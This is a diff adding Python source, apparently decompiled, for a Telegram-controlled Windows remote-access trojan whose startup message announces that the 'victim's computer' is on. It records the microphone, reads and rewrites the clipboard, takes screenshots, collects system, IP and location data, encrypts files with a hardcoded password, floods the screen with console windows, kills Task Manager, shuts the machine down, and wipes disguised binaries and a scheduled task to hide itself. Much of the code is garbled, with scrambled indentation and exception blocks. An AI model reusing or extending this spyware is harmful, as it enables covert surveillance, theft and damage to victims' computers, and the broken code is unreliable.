+            await message.answer(f'Отправьте файл, который будет сохранен по этому пути:\n{directoryForSaveFiles}')
+            await state.set_state(WaitingForInput.waiting_for_file_upload)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_file_upload, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
+async def handle_document(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        user_data = await state.get_data()
+        directoryForSaveFiles = user_data.get('directoryForSaveFiles')
+        if directoryForSaveFiles and (not os.path.isdir(directoryForSaveFiles)):
+            await message.reply('Необходимо сначала указать корректный путь для сохранения файла. \nПопробуйте снова, перезапустив команду.')
+            await state.clear()
+            return
+        else:  # inserted
+            if message.document:
+                document = message.document
+            else:  # inserted
+                if message.photo:
+                    document = message.photo[(-1)]
+                else:  # inserted
+                    await message.reply('В сообщении нет документа или фото.')
+                    return
+            file_id = document.file_id
+            file_name = document.file_name if hasattr(document, 'file_name') else 'photo.jpg'
+            try:
+                await message.reply('Принял, сохраняю.')
+            except Exception as e:
+                    file_info = await bot.get_file(file_id)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.reply(f'Произошла ошибка при сохранении файла: {e}')
+        return
+
+@dp.message(F.text.lower() == 'запись аудио')
+async def audio_record(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Укажите длительность записи в секундах')
+        await state.set_state(WaitingForInput.waiting_for_audio_recording_duration)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_audio_recording_duration)
+async def process_audio_time_input(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        try:
+            recording_time = int(message.text)
+            await start_audio_recording(message, state, recording_time)
+        except ValueError:
+            pass  # postinserted
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer('Пожалуйста, укажите правильную длительность в секундах')
+        await state.clear()
+
+async def start_audio_recording(message: types.Message, state: FSMContext, recording_time: int):
+    if message.from_user.id in ALLOWED_USER_ID:
+        FORMAT = np.int16
+        CHANNELS = 1
+        RATE = 44100
+        CHUNK = 1024
+        OUTPUT_FILENAME = 'output.wav'
+        save_audio = os.path.join(directory, OUTPUT_FILENAME)
+        await message.answer('Начало записи...')
+        frames = []
+        try:
+            recording = sd.rec(int(RATE * recording_time), samplerate=RATE, channels=CHANNELS, dtype=FORMAT)
+            sd.wait()
+            frames = recording
+        except Exception as e:
+            pass  # postinserted
+        else:  # inserted
+            await message.answer('Запись завершена.')
+        with wave.open(save_audio, 'wb') as wf:
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(2)
+            wf.setframerate(RATE)
+            wf.writeframes(frames.tobytes())
+        try:
+            file_to_send = FSInputFile(save_audio)
+            await message.answer_document(document=file_to_send, caption='Вот запись аудио!')
+        except Exception as e:
+                os.remove(save_audio)
+                await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при записи: {e}')
+        await message.answer(f'Ошибка при отправке файла: {e}')
+
+@dp.message(F.text.lower() == 'посмотреть буфер обмена')
+async def conten(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        clipboard_content = pyperclip.paste()
+        await message.answer(f'Содержимое буфера обмена:\n{clipboard_content}')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'изменить буфер обмена')
+async def new_Clipboard(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Хорошо, отправь мне текст на который хочешь заменить буфер обмена')
+        await state.set_state(WaitingForInput.waiting_for_clipboard_change)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_clipboard_change)
+async def new_Clipboard_wait(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        new_text = message.text
+        pyperclip.copy(new_text)
+        await message.answer('Текст успешно помещен в буфер обмена!')
+        await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'открыть ссылку')
+async def open_url(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Ок, кидай ссылку.')
+        await state.set_state(WaitingForInput.waiting_for_url_open)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_url_open)
+async def open_url(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        url = message.text
+        webbrowser.open(url)
+        await asyncio.sleep(1)
+        await message.answer('Ссылка была успешно открыта:')
+        screenshot = pyautogui.screenshot()
+        filename = 'screenshot.png'
+        filepath = os.path.join(directory, filename)
+        os.makedirs(directory, exist_ok=True)
+        screenshot.save(filepath)
+        photo = FSInputFile(filepath)
+        await message.answer_photo(photo)
+        if os.path.exists(filepath):
+            os.remove(filepath)
+        await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'закрыть диспетчер задач')
+async def open_url(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] == 'Taskmgr.exe':
+                psutil.Process(proc.info['pid']).terminate()
+                await message.answer('Task Manager закрыт.')
+                return
+        else:  # inserted
+            await message.answer('Диспетчер задач не запущен.')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'выключить звук')
+async def open_url(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def mute_sound():
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
+            volume.SetMute(1, None)
+        mute_sound()
+        await message.answer('Звук отключен.')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'включить звук')
+async def open_url(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def mute_sound():
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
+            volume.SetMute(0, None)
+        mute_sound()
+        await message.answer('Звук включен.')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'звук на 100%')
+async def open_url(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def set_volume_to_100():
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
+            volume.SetMasterVolumeLevelScalar(1.0, None)
+        set_volume_to_100()
+        await message.answer('Громкость была установлена на 100%✅')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+@dp.message(F.text.lower() == 'зашифровать файл')
+async def start_encryption(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Укажите путь и расширение файла\\, пример:*\nC:/Users/Public/Название\\_файла\\.txt', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.waiting_for_file_encryption_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_file_encryption_path)
+async def process_file_path(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        file_path = message.text
+        try:
+            if os.path.exists(file_path):
+                def generate_key(password: str, salt: bytes) -> bytes:
+                    kdf = Scrypt(salt=salt, length=32, n=16384, r=8, p=1, backend=default_backend())
+                    return kdf.derive(password.encode())
+
+                def encrypt_file(file_path: str, password: str):
+                    try:
+                        salt = os.urandom(16)
+                        key = generate_key(password, salt)
+                        iv = os.urandom(16)
+                        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+                        encryptor = cipher.encryptor()
+                        with open(file_path, 'rb') as f:
+                            pass  # postinserted
+                    except Exception as e:
+                            file_data = f.read()
+                                padder = padding.PKCS7(128).padder()
+                                padded_data = padder.update(file_data) + padder.finalize()
+                                encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+                                with open(file_path, 'wb') as f:
+                                    f.write(salt + iv + encrypted_data)
+                                        return True
+                            logger.error(f'Ошибка при шифровании файла {file_path}: {e}')
+                            return False
+                        else:  # inserted
+                            pass
+                password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'
+                success = encrypt_file(file_path, password)
+                if success:
+                    await message.answer(f'*Файл* \'{file_path}\' *успешно зашифрован.*', parse_mode='Markdown')
+        except Exception as e:
+                        await state.clear()
+                else:  # inserted
+                    await message.answer(f'Произошла ошибка при шифровании файла {file_path}. Процесс прекращён.')
+                        await state.clear()
+            else:  # inserted
+                await message.answer(f'Файл {file_path} не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.')
+                    await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await state.clear()
+        return
+
+@dp.message(F.text.lower() == 'расшифровать файл')
+async def start_decipher(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Укажите путь и расширение файла\\, пример:*\nC:/Users/Public/Название\\_файла\\.txt', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.waiting_for_file_decryption_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_file_decryption_path)
+async def process_file_path(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        encrypted_file_path = message.text
+
+        async def generate_key(password: str, salt: bytes) -> bytes:
+            kdf = Scrypt(salt=salt, length=32, n=16384, r=8, p=1, backend=default_backend())
+            return kdf.derive(password.encode())
+
+        async def decrypt_file(file_path: str, password: str):
+            try:
+                if os.path.exists(file_path):
+                    with open(file_path, 'rb') as f:
+                        pass  # postinserted
+            except Exception as e:
+                        salt = f.read(16)
+                        iv = f.read(16)
+                        encrypted_data = f.read()
+                            key = await generate_key(password, salt)
+                                cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+                                decryptor = cipher.decryptor()
+                                decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
+                                unpadder = padding.PKCS7(128).unpadder()
+                                unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
+                                decrypted_file_path = f'{os.path.basename(file_path)}'
+                                with open(decrypted_file_path, 'wb') as f:
+                                    f.write(unpadded_data)
+                                        await message.answer(f'*Файл* \'{decrypted_file_path}\' *успешно расшифрован.*✅', parse_mode='Markdown')
+                                            await state.clear()
+                                                return True
+                else:  # inserted
+                    await message.answer(f'Файл {file_path} не найден.')
+                        await state.clear()
+                    await message.answer(f'Ошибка при расшифровке файла {file_path}: {e}')
+                    await state.clear()
+                    return False
+        password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'
+        await decrypt_file(encrypted_file_path, password)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'cmd бомба')
+async def start_decipher(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Осторожно ❗️\nЕсли запустить эту команду бесконечно, поможет только перезагрузка ПК.\nВведи сколько раз хочешь открыть консоль: \nЕсли хочешь бесконечно, то введи 404')
+        await state.set_state(WaitingForInput.waiting_for_cmd_window_count)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_cmd_window_count)
+async def process_file_path(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        try:
+            BOOM = int(message.text)
+            if BOOM < 0:
+                await message.answer('Количество должно быть неотрицательным. Пожалуйста, попробуйте снова.')
+        except ValueError:
+                    return
+            else:  # inserted
+                if BOOM == 404:
+                    while True:
+                        subprocess.Popen('start cmd', shell=True)
+                for _ in range(BOOM):
+                    subprocess.Popen('start cmd', shell=True)
+                await state.clear()
+                    await message.answer('Консоли открыты.')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer('Пожалуйста, введите корректное число.')
+        return
+    except Exception as e:
+        await message.answer(f'Произошла ошибка: {str(e)}')
+        return
+
+@dp.message(lambda message: message.text and message.text.lower() == 'данные пк')
+async def handle_message(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Начинаем сбор данных о ПК. Это может занять некоторое время.')
+        break
+        try:
+            cpu_info = {'brand_raw': 'Неизвестно', 'arch': platform.architecture()[0], 'cores': psutil.cpu_count(logical=False), 'logical_cores': psutil.cpu_count(logical=True)}
+        except Exception as e:
+            pass  # postinserted
+        else:  # inserted
+            try:
+                result = subprocess.run(['nvidia-smi', '--query-gpu=name,memory.total', '--format=csv,noheader,nounits'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                lines = result.stdout.strip().split('\n')
+                if lines:
+                    name, memory = lines[0].split(',')
+                    gpu_info = f'Модель: {name.strip()}, Память: {memory.strip()} GB'
+                else:  # inserted
+                    gpu_info = 'Видеокарта не обнаружена'
+            finally:  # inserted
+                system_info = platform.uname()
+                user_name = getpass.getuser()
+
+                async def fetch_public_ip():
+                    try:
+                        async with aiohttp.ClientSession() as session:
+                            pass  # postinserted
+                    except asyncio.TimeoutError:
+                                async with session.get('https://api.ipify.org?format=json', timeout=5) as response:
+                                    data = await response.json()
+                                    return data['ip']
+                            return 'Превышено время ожидания для IP-адреса'
+                        except Exception as e:
+                            return f'Ошибка при получении IP: {e}'
+
+                async def fetch_ip_info():
+                    try:
+                        async with aiohttp.ClientSession() as session:
+                            pass  # postinserted
+                    except asyncio.TimeoutError:
+                                async with session.get('http://ip-api.com/json/', timeout=5) as response:
+                                    return await response.json()
+                            return {'error': 'Превышено время ожидания для IP-информации'}
+                        except Exception as e:
+                            return {'error': str(e)}
+                public_ip, ip_info = await asyncio.gather(fetch_public_ip(), fetch_ip_info())
+        except Exception as e:
+                    hostname = socket.gethostname()
+                    local_ip = socket.gethostbyname(hostname)
+                    width, height = pyautogui.size()
+                    total, used, free = shutil.disk_usage('/')
+                    result = subprocess.run(['powershell', '-Command', 'Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                    lines = result.stdout.strip().split('\n')
+                    for line in lines:
+                        if line.strip():
+                            if line.strip() == 'Name':
+                                continue
+                            cpu_name = line.strip()
+                            break
+                    else:  # inserted
+                        cpu_name = 'Не удалось получить название процессора.'
+                    await message.answer('Формируем и отправляем отчет...')
+                        report = f"\n            Данные ПК:\n            Процессор: {cpu_name}\n            Архитектура процессора: {cpu_info['arch']}\n            Количество ядер процессора: {cpu_info['cores']}\n            Логическое количество ядер: {cpu_info['logical_cores']}\n            Видеокарта: {gpu_info}\n            Общая память ОЗУ: {psutil.virtual_memory().total / 1073741824:.2f} GB\n            Память ПК: Свободно {total // 1073741824} ГБ из {system_info.system} {system_info.release}\n            Имя пользователя: {user_name}\n            Имя ПК: {hostname}\n            Разрешение экрана: {width}x{height} \n            Публичный IP-адрес: {public_ip}\n            Локальный IP-адрес: {local_ip}\n            Данные локации и IP: {ip_info}\n            "
+                        await message.answer(report)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при сборе данных о процессоре: {e}')
+        await message.answer(f'Произошла ошибка при сборе данных: {e}')
+        return
+
+@dp.message(lambda message: message.text and message.text.lower() == 'диагностика сети')
+async def handle_network_diagnostics(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Собираем данные это может занять некоторое время.')
+
+        async def ping(host):
+            try:
+                result = subprocess.run(['ping', '-c', '4', host], capture_output=True, text=True)
+                return result.stdout
+            except Exception as e:
+                return f'Ошибка пинга: {e}'
+
+        async def traceroute(host):
+            try:
+                result = subprocess.run(['traceroute', host], capture_output=True, text=True)
+                return result.stdout
+            except Exception as e:
+                return f'Ошибка трассировки: {e}'
+
+        async def scan_ports(host, ports):
+            open_ports = []
+            for port in ports:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    result = sock.connect_ex((host, port))
+                    if result == 0:
+                        open_ports.append(port)
+                    sock.close()
+                except Exception as e:
+                    pass  # postinserted
+            else:  # inserted
+                return open_ports
+                return f'Ошибка сканирования портов: {e}'
+
+        async def get_network_info():
+            try:
+                info = {}
+            except Exception as e:
+                    return f'Ошибка получения информации о сети: {e}'
+
+        async def resolve_dns(host):
+            try:
+                ip = socket.gethostbyname(host)
+                return f'IP-адрес для {host}: {ip}'
+            except Exception as e:
+                return f'Ошибка разрешения DNS: {e}'
+
+        async def check_website(url):
+            try:
+                response = requests.get(url)
+                return f'Статус сайта {url}: {response.status_code} ({response.reason})'
+            except Exception as e:
+                return f'Ошибка доступа к сайту: {e}'
+
+        async def get_external_ip():
+            try:
+                response = requests.get('https://api.ipify.org?format=json')
+                return f"Внешний IP-адрес: {response.json().get('ip')}"
+            except Exception as e:
+                return f'Ошибка получения внешнего IP: {e}'
+
+        async def network_traffic():
+            try:
+                net_info = psutil.net_io_counters()
+                return f'Принято данных: {net_info.bytes_recv / 1000000:.2f} МБ\nОтправлено данных: {net_info.bytes_sent / 1000000:.2f} МБ'
+            except Exception as e:
+                return f'Ошибка получения информации о трафике: {e}'
+
+        async def get_mtu(interface):
+            try:
+                mtu = psutil.net_if_stats()[interface].mtu
+                return f'MTU для интерфейса {interface}: {mtu}'
+            except Exception as e:
+                return f'Ошибка получения MTU: {e}'
+
+        async def generate_report():
+            report = []
+            report.append('Отчет о сети\n')
+            try:
+                report.append('Результаты пинга:\n')
+                report.append(await ping('google.com') + '\n')
+                except Exception as e:
+                    report.append('Результаты трассировки маршрута:\n')
+                    report.append(await traceroute('google.com') + '\n')
+                report.append(f'Ошибка при создании отчета: {e}\n')
+        await generate_report()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+def confirmation_menu(arg):
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='✅ Да', callback_data=f'con_yes_{arg}'), InlineKeyboardButton(text='❌ Нет', callback_data=f'con_no_{arg}')]])
+    return keyboard
+
+@dp.message(lambda message: message.text and message.text.lower() == 'выключить пк')
+async def start_decipher(message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Вы точно хотите выключить ПК?*', reply_markup=confirmation_menu('of'), parse_mode='Markdown')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.callback_query()
+async def handle_callback(query: types.CallbackQuery, state: FSMContext):
+    if query.data == 'con_yes_of':
+        await query.message.edit_text('ОК, выключаю ПК ✅', reply_markup=None, parse_mode='Markdown')
+        os.system('shutdown /s /t 1')
+        return
+    else:  # inserted
+        if query.data == 'con_no_of':
+            await query.message.edit_text('Отменено ❌', reply_markup=None, parse_mode='Markdown')
+        else:  # inserted
+            if query.data == 'con_yes_rs':
+                await query.message.edit_text('ОК, перезагружаю ПК ✅', reply_markup=None, parse_mode='Markdown')
+                os.system('shutdown /r /t 1')
+            else:  # inserted
+                if query.data == 'con_no_rs':
+                    await query.message.edit_text('Отменено ❌', reply_markup=None, parse_mode='Markdown')
+
+@dp.message(lambda message: message.text and message.text.lower() == 'перезагрузить пк')
+async def start_decipher(message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Вы точно хотите перезагрузить ПК?*', reply_markup=confirmation_menu('rs'), parse_mode='Markdown')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'поменять обои')
+async def wallpaper(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Хорошо, отправьте фото.')
+        await state.set_state(WaitingForInput.waiting_for_wallpaper_image)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_wallpaper_image, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
+async def receiving_photo(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        try:
+            if message.content_type == ContentType.PHOTO:
+                photo = message.photo[(-1)]
+                file_id = photo.file_id
+                file_name = f'{file_id}.jpg'
+            else:  # inserted
+                if message.content_type == ContentType.DOCUMENT:
+                    document = message.document
+                    file_id = document.file_id
+                    file_name = document.file_name
+            file_info = await bot.get_file(file_id)
+        except FileNotFoundError:
+                file_path = file_info.file_path
+                file = await bot.download_file(file_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.reply('Ошибка: файл не найден.')
+        return
+    except Exception as e:
+        full_path = os.path.abspath(image_path)
+        SPI_SETDESKWALLPAPER = 20
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, full_path, 3)
+        await message.reply(f'Произошла ошибка: {e}')
+        return None
+
+@dp.message(F.text.lower() == 'перемистить файл')
+async def start_move_file(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Хорошо, введите путь файла, который хотите переместить (например, C:/Users/Public/Название_файла.txt):')
+        await state.set_state(WaitingForInput.waiting_for_file_move_source_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_file_move_source_path)
+async def get_source_path(message: types.Message, state: FSMContext):
+    source_path = message.text
+    if not os.path.isfile(source_path):
+        await message.answer('Файл не найден. Пожалуйста, убедитесь, что путь к файлу указан правильно и перезапустите процесс.')
+        await state.clear()
+        return
+    else:  # inserted
+        await state.update_data(source_path=source_path)
+        await message.answer('Теперь введите путь, куда нужно переместить файл (например, C:/Users/Public/Целевая_папка/):')
+        await state.set_state(WaitingForInput.waiting_for_file_move_destination_path)
+
+@dp.message(WaitingForInput.waiting_for_file_move_destination_path)
+async def get_destination_path(message: types.Message, state: FSMContext):
+    destination_path = message.text
+    data = await state.get_data()
+    source_path = data.get('source_path')
+    if not os.path.isdir(destination_path):
+        await message.answer('Целевая директория не найдена. Пожалуйста, убедитесь, что путь к директории указан правильно и перезапустите процесс.')
+        await state.clear()
+    else:  # inserted
+        try:
+            shutil.move(source_path, destination_path)
+            await message.answer(f'Файл успешно перемещён в {destination_path}.')
+        except FileNotFoundError:
+                await message.answer('Файл или директория не найдены. Проверьте путь.')
+            except PermissionError:
+                await message.answer('Недостаточно прав для перемещения файла. Пожалуйста, проверьте права доступа.')
+            except OSError as e:
+                await message.answer(f'Ошибка доступа к файлу или директории: {e}')
+            except Exception as e:
+                await message.answer(f'Произошла непредвиденная ошибка: {e}')
+
+@dp.message(F.text.lower() == 'самоуничтожение')
+async def start_move_file(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer(f'Вы уверены что хотите это сделать? \nДля подтверждения отправтее эту комбинацию:\'{a}\'')
+        await state.set_state(WaitingForInput.waiting_for_self_destruction_code)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_self_destruction_code)
+async def get_destination_path(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        code = message.text
+
+        async def kill_process_by_name(process_name):
+            try:
+                subprocess.run(['taskkill', '/IM', process_name, '/F'], check=True)
+            except subprocess.CalledProcessError as e:
+                return
+        if code == str(a):
+            await message.answer('Было приятно с вами поработать, Сэр. Выполняю протокол \'самоуничтожение\'.')
+            cloudflared_name = 'cloudflared-windows-amd64.exe'
+            ffmpeg_name = 'ffmpeg.exe'
+            await kill_process_by_name(cloudflared_name)
+            await kill_process_by_name(ffmpeg_name)
+            await kill_process_by_name(flask_name)
+            await asyncio.sleep(5)
+            if os.path.exists(ffmpeg_path):
+                os.remove(ffmpeg_path)
+            if os.path.exists(cloudflared_path):
+                os.remove(cloudflared_path)
+            if os.path.exists(flask_path):
+                os.remove(flask_path)
+            task_name = 'TaskSync'
+            command = ['schtasks', '/delete', '/tn', task_name, '/f']
+
+            def task_exists(task_name):
+                """Проверка наличия задачи в расписании"""  # inserted
+                try:
+                    result = subprocess.run(['schtasks', '/query', '/tn', task_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    return result.returncode == 0
+                except Exception as e:
+                    print(f'Error checking task existence: {e}')
+                    return False
+
+            def self_destruct(delete_command):
+                try:
+                    if task_exists(task_name):
+                        subprocess.run(command, check=True)
+                    else:  # inserted
+                        if False:
+                            pass  # postinserted
+                    except Exception as e:
+                        pass  # postinserted
+                    else:  # inserted
+                        try:
+                            subprocess.Popen(f'ping localhost -n 5 > nul && {delete_command}', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                except Exception as e:
+                        else:  # inserted
+                            os._exit(0)
+                        pass
+                pass
+                    print(f'Error during self destruction: {e}')
+
+            def kill_process_by_name(name):
+                for proc in psutil.process_iter(['pid', 'name']):
+                    try:
+                        if proc.info['name'].lower() == name.lower():
+                            proc.kill()
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass  # postinserted
+                    pass
+                else:  # inserted
+                    pass
+            if __name__ == '__main__':
+                appdata_local = os.path.expandvars('%LOCALAPPDATA%')
+                folder_path = os.path.join(appdata_local, 'SystemEchoData')
+                file_name = 'SystemEcho.exe'
+                delete_command1 = os.path.join(folder_path, file_name)
+                exe_path1 = sys.executable
+                delete_command = f'del \"{exe_path1}\"'
+                kill_process_by_name('AppShellSurrogate.exe')
+                defolt = 'C:/Users/Default/AppData/Local/Microsoft/Windows/Shell/ShellSyncApp.exe'
+                if os.path.isfile(defolt):
+                    os.remove(defolt)
+                delete_command1 = 'C:\\Windows\\System32\\AppShellSurrogate.exe'
+                if os.path.isfile(delete_command1):
+                    os.remove(delete_command1)
+                time.sleep(1)
+                self_destruct(delete_command)
+                sys.exit()
+        else:  # inserted
+            await message.answer('Комбинация была введена неверно. Продолжаю работать дальше с вами, Сэр.')
+            await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+async def send():
+    for i in ALLOWED_USER_ID:
+        try:
+            await bot.send_message(i, 'Компьютер жертвы включён. ✅\n/start 👈 клавиатура')
+    except:
+        pass
+
+async def main():
+    if False:
+        try:
+            await send()
+                await dp.start_polling(bot)
+if __name__ == '__main__':
+    asyncio.run(main())
